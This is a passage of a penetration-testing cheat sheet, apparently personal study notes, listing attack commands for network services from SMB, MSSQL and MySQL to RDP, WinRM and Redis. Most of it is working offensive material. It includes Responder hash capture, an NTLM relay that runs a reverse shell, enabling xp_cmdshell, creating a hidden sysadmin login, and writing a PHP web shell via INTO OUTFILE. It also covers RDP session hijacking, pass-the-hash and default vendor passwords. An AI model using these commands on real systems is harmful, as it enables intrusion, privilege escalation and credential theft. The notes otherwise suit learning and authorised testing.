  ```

- `rpccclient`

  ```bash
  rcpclient -U "user" [IP]	# -U'%' to anonymous login
  ```

  - `srvinfo`  Server information.
  - `enumdomains`  Enumerate all domains that are deployed in the network.
  - `querydominfo`  Provides domain, server, and user information of deployed domains.
  - `netshareenumall`  Enumerates all available shares.
  - `netsharegetinfo <share>`  Provides information about a specific share.
  - `enumdomusers`  Enumerates all domain users.
  - `queryuser <RID>`  Provides information about a specific user.
  - `querydispinfo` Dispays descriptions of users (could be some ppassword in it)
  - `enumprinters`

  The query `queryuser <RID>` is mostly allowed based on the RID. So we can use the rpcclient to brute force the RIDs to get information. Because we may not know who has been assigned which RID, we know that  we will get information about it as soon as we query an assigned RID:

  ```bash
  for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
  ```

  - `seq 500 1100` generates a sequence of numbers from 500 to 1100
  - `-c "queryuser 0x$(printf '%x\n' $i)"`: Executes the `queryuser` command to query information about a user by their RID (Relative Identifier)

- `smbclient.py`

  - Connect:
  
    `[[domain/]username[:password]@]<targetName or address>`
  
  - Interation:
  
    ```bash
    # List shares
    shares
    # Use share
    use <share>
    # List files
    ls
    # Get file
    get <file>
    ```
  
- `smbclient`

  - `smbclient //[IP ADDRESS]{/FOLDER}`
    - `-N` anonymous access
    - `-U` specify user
  - `-L` display the list of shares (only to display without access!!)

  - The ones accessible without authentication don't have the dollar sign `$`

    - `cd`, `ls`, and to download a file `get`.


    - `!<cmd>` to execute local system commands without interrupting the connection


    - `smbstatus` shows the version and who, from which host, and which share the client is connected


    - `psexec` to open a shell

- `smbmap`

  ```bash
  # List shares
  smbmap -H [IP]
  # Browse directories
  smbmap -H [IP] -r [Folder]
  # Browse directories recursevely
  smbmap -H [IP] -R [Folder]
  # Download
  smbmap -H [IP] --download "[PATH_TO_FILE]"
  # Uploas
  smbmap -H [IP] --upload [FILE_NAME] "[OUTPUT_LOCATION]"
  ```

- `mount`

  - ```bash
    sudo mkdir /tmp/share
    sudo mount -t cifs -o username=[],password=[],domain=. //192.168.220.129/share /tmp/share
    ```

- [SMBMap](https://github.com/ShawnDEvans/smbmap)

- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

- `impacket`

  - ```bash
    impacket-psexec [USER]:[PASS]@[IP]
    ```

-  Windows `CMD`

  - ```cmd-session
    # Display Share and connect
    net use n: \\192.168.220.129\Share /user:user pass
    
    # Search for file name
    dir n:\*[STRING]* /s /b	
    
    # Search for string in file
    findstr /s /i cred n:\*.*
    ```

    Some string to search for:

    - cred, password, users, secrets, key
    - Common File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html.

- `Powershell`

  - ```powershell-session
    # Display share
    Get-ChildItem \\192.168.220.129\share\
    
    # Connect with Anonymous
    New-PSDrive -Name "N" -Root "\\192.168.220.129\share" -PSProvider "FileSystem"
    
    # Connect with credentials
    $username = 'plaintext'
    $password = 'Password123'
    $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
    New-PSDrive -Name "N" -Root "\\192.168.220.129\share" -PSProvider "FileSystem" -Credential $cred
    
    # Serch file name
    Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
    
    # Search string in file
    Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
    ```

#### Exploit

- **EternalBlue:** anything that uses SMBv1 is at risk

- **SMBGHOST**: SMB v3.1.1 RCE

  It is an [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow) vulnerability in a function of an SMB driver that allows system commands to be overwritten while accessing memory. 

- **Forced Authentication:**

  Create a fake SMB server to capture users hashes.

  When you try to connect to a network location (like a shared folder), your computer needs to find its IP address. It does this by following a series of steps:

  1. **Check the hosts file** (a local file with address records).
  2. **Check the local DNS cache** (a memory of recently resolved addresses).
  3. Ask the configured DNS server if no local records are found.
  4. If all else fails, **broadcast a request to all devices on the network**, asking for the address.

  If the name you type is wrong (e.g., `\\mysharefoder\` instead of `\\mysharedfolder\`), the computer can't find the correct address. It will eventually broadcast a request to the whole network.

  Here’s the risk: attackers can intercept this broadcast and send a fake response, tricking your computer into trusting their malicious server. This is often used to steal sensitive information, like login credentials.

  ```bash
  sudo responder -I [INTERFACE]
  ```

  Hashes are saved in `/usr/share/responder/logs/`

  - If the hash cannot be cracked, you can use the hash to log in to another server:

    1. Set `SMB = OFF` and `HHTP = OFF` in `/etc/responder/Responder.conf`

    2. Turn on responder

    3. Use netexec to see what servers IPs are vulnerable to the attacks, that is the ones with SMBsigning sets to off (signing:False):

       ```bash
       nxc smb [IP RANGE]
       ```
    
    4. Generate Reverse Shell Base 64 and open listener
    
    5. Relay with `impacket-ntlmrelayx`:
    
       ```bash
       impacket-ntlmrelayx --no-http-server -smb2support -t [VULNERABLE_IP]-c '[REV SHELL BASE64]'
       ```
    
       



### 143, 993 IMAP

#### Generalities:

**Type:** Email receiving

- Purpose:
  - Access emails from a mail server
  - Allows online management on the server (supports folders)
  - Authentication to the desire mailbox
  - No-encryption: transmits commands, emails, or usernames and passwords in plain text.
  - SSL/TLS to require an encrypted session (on the higher port if present)

#### Configuration

In the documentation of Dovecot, we can find the individual [core settings](https://doc.dovecot.org/settings/core/) and [service configuration](https://doc.dovecot.org/configuration_manual/service_configuration/) options.

**Dangerous Settings:**

| **Setting**               | **Description**                                              |
| ------------------------- | ------------------------------------------------------------ |
| `auth_debug`              | Enables all authentication debug logging.                    |
| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. |
| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons. |
| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated. |
| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |

#### Interaction

- nmap will return the available commands that can be executed

- If we discover the credentials:

  ```bash
  curl -k 'imaps://[IP]' --user user:password -v
  ```

  -  `verbose` (`-v`) we can see the version of TLS used for  encryption, further details of the SSL certificate, and even the banner, which could contain the version of the mail server.

- To connect via openssl (also `netcat` is possible):

  ```bash
  openssl s_client -connect [IP]:imaps
  ```

```bash
# Login
    A1 LOGIN username password
Values can be quoted to enclose spaces and special characters. A " must then be escape with a \
    A1 LOGIN "username" "password"

# List Folders/Mailboxes
    A1 LIST "" *
    A1 LIST INBOX *
    A1 LIST "Archive" *

# Create new Folder/Mailbox
    A1 CREATE INBOX.Archive.2012
    A1 CREATE "To Read"

# Delete Folder/Mailbox
    A1 DELETE INBOX.Archive.2012
    A1 DELETE "To Read"

# Rename Folder/Mailbox
    A1 RENAME "INBOX.One" "INBOX.Two"

# List Subscribed Mailboxes
    A1 LSUB "" *

#Status of Mailbox (There are more flags than the ones listed)
    A1 STATUS INBOX (MESSAGES UNSEEN RECENT)

# Select a mailbox
    A1 SELECT INBOX

# List messages
    A1 FETCH 1:* (FLAGS)
    A1 UID FETCH 1:* (FLAGS)

# Retrieve Message Content
    A1 FETCH 2 body[text]
    A1 FETCH 2 all
    A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])

# Close Mailbox
    A1 CLOSE

# Logout
    A1 LOGOUT
```

### 389, 636, 3268 LDAP

1. nxc to get / verify credentials 
2. 

### 161u - SNMP

#### Generalities

**Type:** Database

- Purpose:
  - monitor network devices
  - handle configuration tasks and change settings remotely
  - SNMP-enabled hardware includes routers, switches, servers, IoT devices...
  - Sends traps over UDP port 161: data packets sent from the SNMP server to the client without  being explicitly requested. If a device is configured accordingly, an  SNMP trap is sent to the client once a specific event occurs on the  server-side. For the SNMP client and server to exchange the respective values, the  available SNMP objects must have unique addresses known on both sides. 
- MIB
  - Text file in which all queryable SNMP objects of a device are listed as a tree
  - It contains at least one `Object Identifier` (`OID`) (a node in the tree, uniquely identified by a sequence of numbers), which, in addition to the necessary unique address and a name, also  provides information about the type, access rights, and a description of the respective object.
- Authentication and Encryption
  - Only in version 3 we have encryption and authentication via user:pass
  - Community strings: in v2, determine whether the requested information can be viewed or not, thus can be seen as passwords

#### Configuration

- Daemon

  - All the settings in the [manpage](http://www.net-snmp.org/docs/man/snmpd.conf.html).

  - `cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'`

  - Dangerous Settings:

  - | **Settings**                                     | **Description**                                              |
    | ------------------------------------------------ | ------------------------------------------------------------ |
    | `rwuser noauth`                                  | Provides access to the full OID tree without authentication. |
    | `rwcommunity <community string> <IPv4 address>`  | Provides access to the full OID tree regardless of where the requests were sent from. |
    | `rwcommunity6 <community string> <IPv6 address>` | Same access as with `rwcommunity` with the difference of using IPv6. |

#### Interaction

1. Query the OIDs with their information

   ```bash
   snmpwalk -v2c -c public [IP]
   ```

2. Brute-force community strings (if version 1,2)

   ```bash
   onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt [IP]
   ```

    [crunch](https://secf00tprint.github.io/blog/passwords/crunch/advanced/en) to create custom wordlists

3. Brute-force OIDs after a community string is known

   ```bash
   braa <community string>@<IP>:.1.3.6.*
   ```

### 512-4 - Rservices

#### Generalities

- **Type:** Authentication

- `r-services` were the de facto standard for remote access between Unix operating systems until they were replaced by the Secure Shell (`SSH`) 
- 

#### Exploit

-  man-in-the-middle (`MITM`) attacks.

#### Configuration

- The `/etc/hosts.equiv` (global configuration) and `.rhosts` (per user configuration) file contains a list of trusted hosts, which are granted access without authentication.

- Additionally, the `+` modifier can be used within these files as a wildcard to specify anything.

  

#### Interaction

| **Command**                | **Service Daemon** | **Port** | **Description**                                              |
| -------------------------- | ------------------ | -------- | ------------------------------------------------------------ |
| `rcp` (remote copy)        | `rshd`             | 514      | Copy a file or directory bidirectionally. No warning for overwriting existing files. |
| `rsh` (remote shell)       | `rshd`             | 514      | Opens a shell without login. Relies upon the trusted entries in the `hosts.equiv` and `.rhosts` files. |
| `rexec` (remote execution) | `rexecd`           | 512      | Runs shell commands. Requires authentication Authentication or the trusted entries in the `hosts.equiv` and `.rhosts` files. |
| `rlogin` (remote login)    | `rlogind`          | 513      | Logs in, through Authentication or the trusted entries in the `hosts.equiv` and `.rhosts` files. |

After Login:

- `rho [IP]`

  Lists all interactive sessions on the local network. The daemon periodically broadcasts information about logged-on users, so it might be beneficial to watch the network traffic.

- `ruser -al [IP]`

  Gives a more detailed account of all logged-in users over the network

### 623u - IPMI

#### Generalities

- **Type:**
- Purpose:
  - manage and monitor systems even if they are powered off or in an unresponsive state
  -  remote upgrades
  - Before the OS has booted to modify BIOS settings
  - When the host is fully powered down
  - Access to a host after a system failure
  - querying inventory information, reviewing hardware logs, and alerting using SNMP.
- Structure
  - The host system can be powered off, but the IPMI module requires a power source and a LAN connection to work correctly.
  - Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs).
  - If we can access a BMC during an assessment, we would gain full access  to the host motherboard and be able to monitor, reboot, power off, or  even reinstall the host operating system. 


#### Configuration

- Some unique default passwords

  | Product         | Username      | Password                                                     |
  | --------------- | ------------- | ------------------------------------------------------------ |
  | Dell iDRAC      | root          | calvin                                                       |
  | HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
  | Supermicro IPMI | ADMIN         | ADMIN                                                        |

#### Exploit

- IPMI 2.0

  During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes  place. This can be leveraged to obtain the password hash for ANY valid  user account on the BMC. 

  - Metasploit [IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/) module.

    ```bash
    msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
    msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts [IP]
    ```

  -  In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command

     `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` 

    which tries all combinations of upper case letters and numbers for an eight-character password.

#### Interaction

- nmap sctipt

- metasploit version scan

  ```shell
  msf6 > use auxiliary/scanner/ipmi/ipmi_version 
  ```


### 873 - Rsyinc

#### Generalities

- [Rsync](https://linux.die.net/man/1/rsync) is a fast and efficient tool for locally and remotely copying files.
- This [guide](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync) covers some of the ways Rsync can be abused (sometimes also without authentication)

#### Interaction

```bash
rsync -av --list-only rsync://[IP]/[SHARE]
```

-  If Rsync is configured to use SSH to transfer files, we could modify our commands to include the `-e ssh` flag, or `-e "ssh -p2222"` if a non-standard port is in use for SSH.

- To read: `rsync -av --list-only rsync://{HOST}/`

- To copy: `rsync -av rsync://{HOST}/{module} [YOUR DIRECTORY]`

### 1433 - MSSQL

#### Generalities

- **Type: ** Database

- Purpose:
  - closed source and was initially written to run on Windows
  - Many other clients can be used to access msSQL, such as
    - [mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15)
    - [SQL Server PowerShell](https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-ver15)
    - [HeidiSQL](https://www.heidisql.com)
    - [SQLPro](https://www.macsqlclient.com)
    - [Impacket's mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)

-  Structure

   | Default Database | Description                                                  |
   | ---------------- | ------------------------------------------------------------ |
   | `master`         | Tracks all system information for an SQL server instance     |
   | `model`          | Acts as a structure for every new database  created. Any setting changed in the model database will be reflected in  any new database created after |
   | `msdb`           | The SQL Server Agent uses this database to schedule jobs & alerts |
   | `tempdb`         | Stores temporary objects                                     |
   | `resource`       | Read-only database containing system objects included with SQL server |

#### Configuration

- Initially, the SQL service will likely run as `NT SERVICE\MSSQLSERVER`.
- **Dangerous settings**
  - Not using encryption to connect
  - The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
  - The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
  - Weak & default `sa` credentials. 

#### Interaction

- **Linux auth:**

  If credentials are known:

  ```bash
  mssqlclient.py [domain]/[USER]@[IP] -windows-auth
  ```

- **Windows Authentication** 

  - Usinf `sqsh`:

    ```cmd
    sqsh -S 10.129.20.13 -U username -P pass
    ```

  - To connect with windows authentication:

    ```cmd
    sqlcmd -S localhost -E
    ```

  - with the server authentication;

    ```cmd
    sqlcmd -S localhost -U your_username -P your_password 
    ```

  - The interaction is the same as below, but you need to run `GO` after every command.

- **Default credentials:** `sa` and empty passwd 

```bash
# Get Server Name
SELECT @@SERVERNAME AS ServerName;
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#Read tables
SELECT * FROM yourTableName;
#Read a specific row with a certain column value
SELECT * FROM yourTableName WHERE columnName = 'specificValue';
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'

#Enumerate links
enum_links
#Use a link
use_link [NAME]

# Execute commands (if enabled)
xp_cmdshell "whoami"
# Enable xp_cmdshell (with appropriate privileges) impacket:
enable_xp_cmdshell
# Enable from Windows:
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

#### Exploit

- **Write**

  To write files, [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option) must be enabled:

  ```bash
  # Enable Ole to write files
  sp_configure 'show advanced options', 1
  RECONFIGURE
  sp_configure 'Ole Automation Procedures', 1
  RECONFIGURE
  ```

  - [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), 

  - [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), 
  - [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15),
  -  [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). 

- **Read Local files**

  ```bash
  SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
  ```

- The `xp_regwrite` command is used to elevate privileges by creating new entries in the Windows registry.

- **Capture Hashes**

  1. Start `responder` or `impacket-smbserver`

     ```bash
     sudo responder -I tun0
     ```

     ```bash
     sudo impacket-smbserver share ./ -smb2support
     ```

  2. Hash stealing

     ```bash
     EXEC master..xp_dirtree '\\[RESPONDER IP]\share\'
     
     EXEC master..xp_subdirs '\\[RESPONDER IP]\share\'
     ```
     
  3. Crack the Hash

  4. If cracking doesn't work, relay

- **IMPERSONATE to Privesc**  

   Sysadmins can impersonate anyone by default.

  ```bash
  # Identify which Users we can impersonate
  SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
  GO
  
  # Impersonate an User (e.g. sa) - Recommended within the master DB 
  EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
  GO
  
  # Revert the operation and return to our previous user
  REVERT
  ```
  
- **Communicate with other DB**

  If we manage to gain access to a SQL Server with a linked server  configured, we may be able to move laterally to that database server. 

  ```bash
  # Identify linked Servers (0 is a linked server)
  SELECT srvname, isremote FROM sysservers
  
  # Execute command in the linked server
  EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [[LINKED SERVER]]
  # The output will be 4 numbers, 0 for False and 1 for True
  # If you need quotes in the EXECUTE command, use double quotes inside
  ```
  
  

### 1521 - ORACLE

#### Generalities

- **Type:**
- Purpose:
  - communication protocol that facilitates communication between Oracle databases and applications over networks.
- Structure
  - Can support `SSL/TLS` encryption
  -  it enables encryption between client and server communication through  an additional layer of security over the TCP/IP protocol layer.
  - Supports `IPv6`
  - The TNS listener listens for incoming connections in the port.
    - it will only accept connections from authorized hosts
    - it performs basic authentication using a combination of hostnames, IP  addresses, and usernames and passwords. 
    - It uses Oracle Net Services to encrypt the communication between the client  and the server.
  - a System Identifier (`SID`) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. 
  - An instance is a set of processes and memory structures that interact to manage the database's data.

#### Configuration

- Oracle TNS configuration files, located in the `$ORACLE_HOME/network/admin` directory:

  - `tnsnames.ora`

    Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, containing the necessary information for clients to connect to the service:  name for the service, network location, and database or service name.

  - `listener.ora`

    server-side configuration file that defines the listener process's properties and parameter

- Password:

  - Oracle 9 has a default password, `CHANGE_ON_INSTALL`,
  - Oracle 10 has no default password set. 
  - The Oracle DBSNMP service also uses a default password, `dbsnmp` 

- `PlsqlExclusionList`

  user-created text file that needs to be placed in `$ORACLE_HOME/sqldeveloper`, containing the names of PL/SQL packages or types that  should be excluded from execution. It serves as a  blacklist that cannot be accessed through the Oracle Application Server.

  | **Setting**          | **Description**                                              |
  | -------------------- | ------------------------------------------------------------ |
  | `DESCRIPTION`        | name for the database and its connection type.               |
  | `ADDRESS`            | Network address of the database (hostname port)              |
  | `PROTOCOL`           | protocol used for communication with the server              |
  | `PORT`               | The port used for communication with the server              |
  | `CONNECT_DATA`       | Specifies the attributes of the connection, s.a. the service name or SID, protocol, and database instance identifier. |
  | `INSTANCE_NAME`      | The name of the database instance the client wants to connect. |
  | `SERVICE_NAME`       | The name of the service that the client wants to connect to. |
  | `SERVER`             | The type of server used for the database connection, such as dedicated or shared. |
  | `USER`               | The username used to authenticate                            |
  | `PASSWORD`           | The password used to authenticate                            |
  | `SECURITY`           | The type of security for the connection.                     |
  | `VALIDATE_CERT`      | Whether to validate the certificate using SSL/TLS.           |
  | `SSL_VERSION`        | The version of SSL/TLS to use for the connection.            |
  | `CONNECT_TIMEOUT`    | The time limit in seconds for the client to establish a connection to the database. |
  | `RECEIVE_TIMEOUT`    | The time limit in seconds for the client to receive a response from the database. |
  | `SEND_TIMEOUT`       | The time limit in seconds for the client to send a request to the database. |
  | `SQLNET.EXPIRE_TIME` | The time limit in seconds for the client to detect a connection has failed. |
  | `TRACE_LEVEL`        | The level of tracing for the database connection.            |
  | `TRACE_DIRECTORY`    | The directory where the trace files are stored.              |
  | `TRACE_FILE_NAME`    | The name of the trace file.                                  |
  | `LOG_FILE`           | The file where the log information is stored.                |

#### Interaction

If the client does not specify a SID, the default value defined in the `tnsnames.ora` file is used.

- Guess the `SID`

  - `nmap` brute forcing script

  - Oracle Database Attacking Tool (`ODAT`)

    ```bash
    ./odat.py all -s [IP]
    ```

- Log in

  ```bash
  sqlplus [USER]/[PASSWD]@[IP]/[SID]
  ```

- Log in as the System Database Admin (`sysdba`)

  ```bash
  sqlplus [USER]/[PASSWD]@[IP]/[SID] as sysdba
  ```

- Commands

  -   [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) 
  - `select table_name from all_tables;`  list all available tables in the current database
  - `select * from user_role_privs;` show the privileges of the current user
  - `select name, password from sys.user$;` retrieve the password hashes

- Test if a File Upload is possible (e.g on Win)

  ```bash
  $ echo "Oracle File Upload Test" > testing.txt
  $ ./odat.py utlfile -s [IP] -d [SID] -U [USER] -P [PASSWD] --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
  $ curl -X GET http://[IP]/testing.txt	# Check if it worked
  ```

- Upload a shell (if a web server is run) to the root directory

  - Linux `/var/www/html`
  - Windows `C:\inetpub\wwwroot`

### 3306 - MySQL

#### Generalities

**Type:** Database

- Purpose:

  - Open-source SQL relational database management system developed and supported by Oracle.
  - The MySQL clients can retrieve and edit the data
  - Ideally suited for applications such as *dynamic websites*
  - A MySQL database translates the commands internally into executable code and performs the requested actions.

- Structure:

  - The data is stored in tables with different columns, rows, and data types.

  - often stored in a single file with the file extension `.sql`

#### Configuration

`/etc/mysql/mysql.conf.d/mysqld.cnf`

**Dangerous settings:**

| **Settings**       | **Description**                                              |
| ------------------ | ------------------------------------------------------------ |
| `user`             | Sets which user the MySQL service will run as.               |
| `password`         | Sets the password for the MySQL user.                        |
| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface. |
| `debug`            | This variable indicates the current debugging settings       |
| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
| `secure_file_priv` | This variable is used to limit the effect of data import and export operations. |

- The entries of `user`,`password`, and `admin_address` are made in plain text
- The `debug` and `sql_warnings` settings provide  verbose information output in case of errors, which often contains sensitive content

#### Interaction

- Linux: (try both logins)

  ```bash
  mysql -h [IP] -u root -p[PASSWD]
  ```

- Windows:

  ```cmd
  mysql.exe -u [USER] -p[PASS] -h [IP]
  ```

- `dbeaver` (multi platform app)

The most important databases for the MySQL server are the `system schema` (`sys`) and `information schema`. The system schema contains tables, information, and metadata necessary  for management, see the [reference manual](https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The mysql schema is the,used for other operational purposes) of MySQL. The information schema also contains metadata, but has less information than the previous one.

```sql
# ENUMERATION

# Get version
select version(); or select @@version;
# Show all databases.
show databases;
# Select one of the existing databases.
use <db>;
# Show all available tables in the selected database.
show tables;
# Show the columns of a selected table.
show columns from tabl;
# Show everything in the desired table.
select * from tabl {ORDER BY clumn};
# Show everything in a table in another database.
select * from other_db.tabl;
# Search for a condition in the desired table (AND &&, OR ||", NOT !).
SELECT * FROM tabl WHERE colum = "string";
SELECT * FROM tabl WHERE clm LIKE 'admin%';		# starting with admin
SELECT * FROM tabl WHERE clm LIKE 'admin---';	# "" of lenght +3

# CHANGING VALUES

# Insert a record in table
INSERT INTO table_name VALUES (column1_value, column2_value, ...);
# Update specific records based on conditions
UPDATE table_name SET column1=newvalue1,... WHERE <condition>;


```

#### Exploits

- SQL injection

- **Write**

  - [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). 

  - If connected to a web server:

    - Check read/write privileges

      ```bash
      show variables like "secure_file_priv";
      ```

      - If empty, the variable has no effect, which is not a secure setting.
      - If set to the name of a directory, the server limits import and export operations to work only with files in that directory.
      - If set to NULL, the server disables import and export operations.

    - Write a file in the webserver directory 

      ```bash
      SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
      ```

    - Browse to the location where the file is and execute our commands.

- **Read Local Files** (not allowed by default)

  ```bash
  select LOAD_FILE("/etc/passwd");
  ```

- **Authentication bypass v5.6.x**

  The server takes longer to respond to an incorrect password than to a  correct one. Thus, repeatedly authenticate with the same  incorrect password, will work.

### 3389tu - RDP

#### Generalities

- **Type:** Authentication (remote)
- It opens a live session
- Structure:
  - typically utilizing TCP port 3389 as the transport protocol,  the connectionless UDP protocol can use port 3389 also for remote  administration.
  - For an RDP session to be established, both the network firewall and the  firewall on the server must allow connections from the outside.
  - all data, and especially the login process, is protected in the network  by its good encryption. However, many Windows systems do not insist on  this but still accept inadequate encryption.

#### Interaction

- [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) can unauthentically identify the security settings of RDP servers based on the handshakes.

  ```bash
  ./rdp-sec-check.pl [IP]
  ```

- Authentication and connection to such RDP servers can be made, for example, using `xfreerdp`, `rdesktop`, or `Remmina` 

  ```bash
  xfreerdp /u:[USER] /p:"[PASSWD]" /v:[IP]
  ```

#### Exploit

- The identity-providing certificates are merely self-signed by default, so the client cannot distinguish a genuine certificate from a forged one and generates a certificate warning for the user.

- **Session Hijacking** (*no longer works on Server 2019*)

  Go from one user to another

  - Get active users with `query user` 

  - If you have SYSTEM privileges (or if you are admin and you can run the terminal as Administrator by right click):

    ```cmd
    tscon [TARGET_SESSION_ID] /dest:[OUR_SESSION_NAME]
    ```

  - If have Administrator privileges:

    1. Create a service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges.

       ```cmd
        sc.exe create service binpath= "cmd.exe /k tscon [TARGET_SESSION_ID] /dest:[OUR_SESSION_NAME]"
       ```

    2. Start the service

       ```cmd
       net start service
       ```

- **Pass-the-Hash (PtH)**

  Login using only the hash

  1. Enable `Restricted Admin Mode`

     ```cmd
     reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
     ```

  2. ```cmd
     xfreerdp /v:[IP] /u:[USER] /pth:[HASH]
     ```

- **BlueKeep (RCE without Auth) **[CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)

### 3632 distccd

**Distcc** is a tool that enhances the **compilation process** by utilizing the **idle processing power** of other computers in the network. When **distcc** is set up on a machine, this machine is capable of distributing its **compilation tasks** to another system. This recipient system must be running the **distccd daemon** and must have a **compatible compiler** installed to process the sent code.

Check if it's vulnerable to **CVE-2004-2687** to execute arbitrary code:

```bash
nmap -p 3632 <ip> --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
```

### 5000 - Docker Registry

#### Generalities

- Purpose:

  Docker images are organized within **Docker repositories** in the registry, each repository storing various versions of a specific image. The functionality provided allows for images to be downloaded  locally or uploaded to the registry, assuming the user has the necessary permissions.

### 5985-6 - WINRM

#### Generalities

- **Type:** Authentication 
- Purpose:
  - remote management protocol based on the command line.
  - WinRM must be explicitly enabled and configured starting with Windows 10
  - Windows Remote Shell (`WinRS`), which lets us execute arbitrary commands on the remote system. The program is included on Windows 7 by default. 
- Structure:
  - WinRM relies on `TCP` ports `5985` and `5986` for communication, with the last port `5986 using HTTPS`, as ports 80 and 443 were previously used for this task. 
  - In general, it only works for active directories

#### Interaction

 [evil-winrm](https://github.com/Hackplayers/evil-winrm) to log in

```bash
evil-wirm -i [IP] -u [USER] -p [PASSWD]
```

To upload /download files use `upload` and `download` in the winrm session. The file must be in the folder you used to connect to winrm.

#### Exploit

The password is stored as an hash,  one-way function that takes any amount of data and returns a fixed size value.

Use responder to attack it: 

```
sudo responder -I tun0 -w -d 
```

it creates a fake shared folder in your network, that if it interacts with the attacked ip (e.g. through the parameter of a web page), will steal the password as an Hash.

The responder IP has to be loaded as a shared folder, i.e. `//<IP>/somefile`, if we want to do RFI.

### 6379 - REDIS

**Type:** Database

 `redis-cli -h [ip]`

Once inside redis environment `info` return information about the  server

- `Server` info: get version of redis
- `Keyspace` list of dictionaries (dictionaries) with statistics: number of keys, number of keys with expiration
- `select {index number of the database}`
- `keys *` List all the keys in the database
- `get {key}`

### 6443 Kubernetes

#### Generalities

Kubernetes revolves around the concept of **pods**, which can hold one or  more closely connected containers. Each pod functions as a separate  virtual machine on a node, complete with its own IP, hostname..

Kubernetes architecture is primarily divided into two types of components:

- The Control Plane (master node), which is responsible for controlling the Kubernetes cluster
- The Worker Nodes (minions), where the containerized applications are run

The Control Plane serves as the management layer. It consists of:

| **Service**             | **TCP Ports**  |
| ----------------------- | -------------- |
| `etcd`                  | `2379`, `2380` |
| `API server`            | `6443`         |
| `Scheduler`             | `10251`        |
| `Controller Manager`    | `10252`        |
